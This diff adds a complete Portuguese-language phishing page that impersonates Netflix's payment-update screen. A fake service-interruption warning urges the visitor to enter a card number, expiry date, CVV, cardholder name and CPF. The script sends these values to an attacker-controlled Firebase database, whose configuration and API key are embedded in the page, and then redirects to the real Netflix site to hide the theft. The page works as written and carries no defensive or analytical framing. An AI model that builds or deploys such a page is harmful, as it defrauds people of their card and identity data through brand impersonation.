@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Netflix - Atualização de Pagamento</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    input::placeholder {
+      color: #9ca3af;
+    }
+  </style>
+  <!-- Firebase App (compatível) -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <!-- Firebase Realtime Database -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+</head>
+<body class="bg-white text-gray-900">
+  <!-- Cabeçalho -->
+  <header class="p-4 border-b">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="h-6" alt="Netflix" />
+  </header>
+
+  <main class="max-w-md mx-auto p-6">
+    <!-- Alerta -->
+    <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 p-4 rounded mb-6 text-sm">
+      <strong>Atenção:</strong> atualize os dados do seu cartão para manter a sua assinatura da Netflix ativa e evitar a interrupção do serviço.
+    </div>
+
+    <h1 class="text-2xl font-bold mb-3">
+      Informe os dados do seu<br />cartão de crédito ou débito
+    </h1>
+
+    <p class="text-sm text-gray-700 mb-4">
+      Para continuar assistindo aos seus filmes e séries favoritos, é necessário confirmar as informações do seu cartão.
+    </p>
+
+    <!-- Bandeiras -->
+    <div class="flex gap-2 mb-4">
+      <img src="https://img.icons8.com/color/48/visa.png" class="h-6" alt="Visa" />
+      <img src="https://img.icons8.com/color/48/mastercard-logo.png" class="h-6" alt="MasterCard" />
+      <img src="https://img.icons8.com/color/48/amex.png" class="h-6" alt="Amex" />
+      <img src="https://img.icons8.com/color/48/diners-club.png" class="h-6" alt="Diners" />
+      <img src="https://img.icons8.com/color/48/discover.png" class="h-6" alt="Discover" />
+    </div>
+
+    <!-- Formulário -->
+    <input
+      id="numero-cartao"
+      type="text"
+      placeholder="Número do cartão"
+      maxlength="19"
+      class="w-full border p-3 rounded mb-3"
+      autocomplete="cc-number"
+      inputmode="numeric"
+    />
+
+    <div class="flex gap-2 mb-3">
+      <input
+        id="validade"
+        type="text"
+        placeholder="Data de validade (MM/AA)"
+        maxlength="5"
+        class="w-1/2 border p-3 rounded"
+        autocomplete="cc-exp"
+        inputmode="numeric"
+      />
+      <input
+        id="cvv"
+        type="text"
+        placeholder="CVV"
+        maxlength="4"
+        class="w-1/2 border p-3 rounded"
+        autocomplete="cc-csc"
+        inputmode="numeric"
+      />
+    </div>
+
+    <input
+      id="nome-cartao"
+      type="text"
+      placeholder="Nome no cartão"
+      class="w-full border p-3 rounded mb-3"
+      autocomplete="cc-name"
+    />
+
+    <!-- Campo CPF -->
+    <input
+      id="cpf"
+      type="text"
+      placeholder="CPF"
+      maxlength="14"
+      class="w-full border p-3 rounded mb-4"
+      autocomplete="off"
+      inputmode="numeric"
+    />
+
+    <!-- Tipo de pagamento -->
+    <p class="text-sm mb-2">Forma de pagamento preferida</p>
+    <div class="flex gap-4 mb-4">
+      <label class="flex items-center gap-2">
+        <input type="radio" name="tipo" checked />
+        Crédito
+      </label>
+      <label class="flex items-center gap-2">
+        <input type="radio" name="tipo" />
+        Débito
+      </label>
+    </div>
+
+    <!-- Botão -->
+    <button
+      id="btn-atualizar"
+      class="w-full bg-red-600 text-white py-3 font-semibold text-lg rounded hover:bg-red-700"
+      type="button"
+    >
+      Atualizar assinatura
+    </button>
+
+    <!-- reCAPTCHA -->
+    <p class="text-[10px] text-gray-500 mt-4">
+      Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô.
+      <a href="#" class="underline text-gray-600">Saiba mais.</a>
+    </p>
+  </main>
+
+  <script>
+    // Configuração Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyDaf1s5yPV2_Q4XNjyJPrcYKvO99C5mTn4",
+      authDomain: "netflix-bb671.firebaseapp.com",
+      databaseURL: "https://netflix-bb671-default-rtdb.firebaseio.com",
+      projectId: "netflix-bb671",
+      storageBucket: "netflix-bb671.firebasestorage.app",
+      messagingSenderId: "98864933389",
+      appId: "1:98864933389:web:f79f0706e4fd7c54174344"
+    };
+
+    // Inicializa Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const pagamentosRef = db.ref('pagamentos');
+
+    // Inputs e botão
+    const inputs = Array.from(document.querySelectorAll('input'));
+    const botao = document.getElementById('btn-atualizar');
+    const cartaoInput = document.getElementById('numero-cartao');
+    const validadeInput = document.getElementById('validade');
+    const cvvInput = document.getElementById('cvv');
+    const cpfInput = document.getElementById('cpf');
+    const nomeCartaoInput = document.getElementById('nome-cartao');
+
+    // Navegação com Enter
+    inputs.forEach((input, index) => {
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          const nextInput = inputs[index + 1];
+          if (nextInput) {
+            nextInput.focus();
+          } else {
+            botao.click();
+          }
+        }
+      });
+    });
+
+    // Máscaras
+    cartaoInput.addEventListener('input', (e) => {
+      let valor = e.target.value.replace(/\D/g, '').slice(0, 16);
+      valor = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
+      e.target.value = valor;
+    });
+
+    validadeInput.addEventListener('input', (e) => {
+      let valor = e.target.value.replace(/\D/g, '').slice(0, 4);
+      if (valor.length >= 3) {
+        valor = valor.replace(/(\d{2})(\d{1,2})/, '$1/$2');
+      }
+      e.target.value = valor;
+    });
+
+    cvvInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    });
+
+    cpfInput.addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, '').slice(0, 11);
+      v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      v = v.replace(/(\d{3})(\d)/, '$1.$2');
+      v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      e.target.value = v;
+    });
+
+    // Enviar dados e redirecionar
+    botao.addEventListener('click', () => {
+      const validade = validadeInput.value;
+      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(validade)) {
+        alert('Data de validade inválida. Use o formato MM/AA');
+        validadeInput.focus();
+        return;
+      }
+
+      const dados = {
+        numeroCartao: cartaoInput.value.replace(/\s+/g, ''),
+        validade,
+        cvv: cvvInput.value.replace(/\D/g, ''),
+        nomeCartao: nomeCartaoInput.value.trim(),
+        cpf: cpfInput.value.replace(/\D/g, ''),
+        tipoPagamento: document.querySelector('input[name="tipo"]:checked').parentElement.textContent.trim(),
+        dataEnvio: new Date().toISOString()
+      };
+
+      pagamentosRef.push(dados)
+        .then(() => {
+          alert('Dados atualizados, volte a assistir!');
+          window.location.href = 'https://www.netflix.com/browse';
+        })
+        .catch(error => alert('Erro ao enviar dados: ' + error.message));
+    });
+  </script>
+</body>
+</html>
